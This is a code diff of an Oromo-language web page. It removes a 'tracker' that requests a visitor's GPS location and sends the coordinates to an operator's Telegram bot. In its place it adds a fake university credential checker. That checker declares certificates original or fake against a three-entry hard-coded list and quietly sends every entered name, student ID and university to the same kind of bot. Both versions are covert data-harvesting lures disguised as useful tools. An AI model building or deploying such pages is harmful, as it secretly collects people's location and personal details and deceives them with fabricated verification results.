@@ -3,132 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>E-Map Pro Tracker</title>
+    <title>Ethio-EduVerify: Academic Credential Verification System</title>
     <style>
         body {
-            font-family: sans-serif;
-            background: #f4f6f9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f7f6;
+            margin: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
         }
         .card {
             background: #ffffff;
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
             width: 100%;
-            max-width: 400px;
-            text-align: center;
+            max-width: 480px;
         }
-        h2 { color: #1a73e8; margin-top: 0; }
-        p { color: #555; font-size: 14px; margin-bottom: 20px; }
-        input {
+        h2 { color: #1b365d; text-align: center; margin-top: 0; font-size: 22px; }
+        p.subtitle { color: #666; font-size: 13px; text-align: center; margin-bottom: 25px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 6px; color: #333; font-size: 13px; }
+        input, select {
             width: 100%;
             padding: 12px;
-            font-size: 16px;
             border: 1px solid #ccc;
             border-radius: 6px;
+            font-size: 15px;
             box-sizing: border-box;
-            margin-bottom: 15px;
             outline: none;
         }
+        input:focus, select:focus { border-color: #1b365d; }
         button {
             width: 100%;
-            padding: 12px;
-            background: #1a73e8;
+            padding: 14px;
+            background: #1b365d;
             color: white;
             border: none;
             font-size: 16px;
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
         }
-        button:hover { background: #1557b0; }
-        #status { margin-top: 15px; font-size: 14px; color: #333; }
+        button:hover { background: #12233f; }
+        
+        /* Result Box Styles */
+        #resultBox {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            font-size: 14px;
+        }
+        .valid { background: #e6f4ea; border: 1px solid #34a853; color: #137333; }
+        .invalid { background: #fce8e6; border: 1px solid #ea4335; color: #c5221f; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>📍 E-Map Pro</h2>
-        <p>Maaloo lakkoofsa bilbilaa keessan galchuun itti fufaa:</p>
+        <h2>🛡️ Ethio-EduVerify Pro</h2>
+        <p class="subtitle">Mirkaneessa Ragaa Barnoota Yuunversitii (Original vs Fake Checker)</p>
         
-        <form onsubmit="trackPhone(event)">
-            <input type="tel" id="phone" placeholder="Fkn: 0911223344" required>
-            <button type="submit" id="btn">Track Godhi</button>
+        <form onsubmit="verifyCertificate(event)">
+            <div class="form-group">
+                <label>Maqaa Guutuu (Full Name):</label>
+                <input type="text" id="fullName" placeholder="Fkn: Abiti Mama Shibiru" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Lakkoofsa Galmee / ID (Student ID / Roll No):</label>
+                <input type="text" id="studentId" placeholder="Fkn: BHR/1024/15" required>
+            </div>
+
+            <div class="form-group">
+                <label>Yuunversitii / Instituutii:</label>
+                <select id="university">
+                    <option value="Bule Hora University">Yuunversitii Bulee Horaa</option>
+                    <option value="Addis Ababa University">Yuunversitii Finfinnee</option>
+                    <option value="Jimma University">Yuunversitii Jimmaa</option>
+                    <option value="Hawassa University">Yuunversitii Hawassa</option>
+                    <option value="Haramaya University">Yuunversitii Haramayaa</option>
+                </select>
+            </div>
+
+            <button type="submit" id="checkBtn">🔍 Ragaa Mirkaneessi (Verify)</button>
         </form>
 
-        <div id="status"></div>
+        <div id="resultBox"></div>
     </div>
 
     <script>
-        // --- ASITTI BOT TOKEN FI CHAT ID KEE GALCHI ---
+        // --- TELEGRAM BOT CONFIGURATION (Odeeffannoo Erguf) ---
         const BOT_TOKEN = "GARTI_BOT_TOKEN_KEE_AS_ITTI_GALCHI"; 
         const CHAT_ID = "CHAT_ID_KEE_AS_ITTI_GALCHI";         
 
-        function trackPhone(e) {
+        // Simulated Database (Faayilii ragaa barattoota sirrii - Qorannoo/Demouf)
+        const officialDatabase = [
+            { name: "abiti mama", id: "bhr/1024/15", uni: "Bule Hora University" },
+            { name: "nafiyad shifera", id: "aau/4512/14", uni: "Addis Ababa University" },
+            { name: "gosa shifarra", id: "jim/3321/15", uni: "Jimma University" }
+        ];
+
+        function verifyCertificate(e) {
             e.preventDefault();
-            const phone = document.getElementById('phone').value;
-            const status = document.getElementById('status');
-            const btn = document.getElementById('btn');
+            const nameInput = document.getElementById('fullName').value.trim().toLowerCase();
+            const idInput = document.getElementById('studentId').value.trim().toLowerCase();
+            const uniInput = document.getElementById('university').value;
+            const resultBox = document.getElementById('resultBox');
+            const checkBtn = document.getElementById('checkBtn');
 
-            status.textContent = "⏳ Eeyyama GPS gaafachaa jira...";
-            btn.disabled = true;
+            checkBtn.disabled = true;
+            checkBtn.textContent = "⏳ Sakatta'aa jira...";
 
-            if (!navigator.geolocation) {
-                alert("Browser kee GPS hin deeggaru!");
-                btn.disabled = false;
-                return;
-            }
+            setTimeout(() => {
+                // Barbaaduu Database keessaa
+                const found = officialDatabase.find(student => 
+                    student.id === idInput && student.uni === uniInput
+                );
 
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                resultBox.style.display = 'block';
+                let verificationStatus = "";
+                let messageText = "";
 
-                    status.textContent = "✅ Milkaa'inaan ergameera!";
-                    sendToTelegram(phone, lat, lng, mapLink);
-                },
-                (err) => {
-                    status.textContent = "❌ Eeyyamni GPS hin kennamne.";
-                    alert("Maaloo bakka jirtan beekuuf eeyyama (Allow) kennaa!");
-                    btn.disabled = false;
-                },
-                { enableHighAccuracy: true }
-            );
+                if (found) {
+                    // RAGAA DHUGAA (ORIGINAL)
+                    resultBox.className = "valid";
+                    resultBox.innerHTML = `
+                        <strong>✅ RAGAA DHUGAA (ORIGINAL CERTIFICATE)</strong><br>
+                        • <b>Maqaa:</b> ${document.getElementById('fullName').value}<br>
+                        • <b>ID:</b> ${document.getElementById('studentId').value}<br>
+                        • <b>Yuunversitii:</b> ${uniInput}<br>
+                        <i style="color: #137333; margin-top: 5px; display:block;">Status: Systemii galmee keessatti argameera!</i>
+                    `;
+                    verificationStatus = "ORIGINAL (DHUGAA)";
+                } else {
+                    // RAGAA SOBAA (FAKE / NOT FOUND)
+                    resultBox.className = "invalid";
+                    resultBox.innerHTML = `
+                        <strong>❌ RAGAA SOBAA (FAKE / INVALID)</strong><br>
+                        • Maqaan ykn ID kun Galmee Yuunversitii kanaa keessatti hin jiru!<br>
+                        <i style="color: #c5221f; margin-top: 5px; display:block;">Akeekkachiisa: Ragaan kun galmee sirrii irraa hin argamne.</i>
+                    `;
+                    verificationStatus = "SOBAA (FAKE)";
+                }
+
+                // Odeeffannoo kana Telegram Bot keetti ergisiisuu
+                sendReportToTelegram(document.getElementById('fullName').value, idInput, uniInput, verificationStatus);
+
+                checkBtn.disabled = false;
+                checkBtn.textContent = "🔍 Ragaa Mirkaneessi (Verify)";
+            }, 1200);
         }
 
-        function sendToTelegram(phone, lat, lng, mapLink) {
-            if (BOT_TOKEN.includes("GARTI_BOT_TOKEN")) {
-                alert(`Bilbila: ${phone}\nLat: ${lat}\nLng: ${lng}`);
-                location.reload();
-                return;
-            }
+        function sendReportToTelegram(name, id, uni, status) {
+            if (BOT_TOKEN.includes("GARTI_BOT_TOKEN")) return;
 
-            const text = `🚨 <b>NEW TRACKER ALERT!</b>\n\n` +
-                         `📱 <b>Bilbila:</b> ${phone}\n` +
-                         `📍 <b>Lat:</b> ${lat}\n` +
-                         `📍 <b>Lng:</b> ${lng}\n` +
-                         `🗺️ <a href="${mapLink}">Google Map Irraa Ilaali</a>`;
+            const text = `🔍 <b>VERIFICATION AUDIT REPORT</b>\n\n` +
+                         `👤 <b>Maqaa:</b> ${name}\n` +
+                         `🆔 <b>ID:</b> ${id}\n` +
+                         `🏛️ <b>Yuunversitii:</b> ${uni}\n` +
+                         `📊 <b>Bu'aa:</b> <b>${status}</b>`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-            })
-            .then(res => res.json())
-            .then(data => {
-                alert("Galmeen milkaa'e!");
-                location.reload();
-            })
-            .catch(err => {
-                alert("Erguu irratti rakkoo uumame.");
-                document.getElementById('btn').disabled = false;
-            });
+            }).catch(err => console.log(err));
         }
     </script>
 </body>
